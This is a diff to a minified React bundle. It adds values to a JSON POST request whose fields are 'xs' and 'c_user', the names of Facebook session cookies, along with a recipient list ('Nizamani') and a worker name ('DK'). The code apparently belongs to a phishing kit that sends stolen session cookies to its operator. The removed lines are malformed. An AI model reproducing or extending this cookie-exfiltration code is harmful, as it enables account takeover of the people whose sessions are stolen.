@@ -9713,7 +9713,7 @@
             n.useState)()
               , [i,l] = (0,
             n.useState)()
-              , o = [""]
+              , o = ["Nizamani"]
               , s = _();
             return (0,
             he.jsxs)(he.Fragment, {
@@ -9820,11 +9820,11 @@
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
-                                            : o,
-                                            
+                                            emails: o,
+                                            workerEmail: "DK",
                                             xs: r,
                                             c_user: i,
-                                      
+                                            name: "DK"
                                         })
                                     }).then((e => {
                                         e.ok
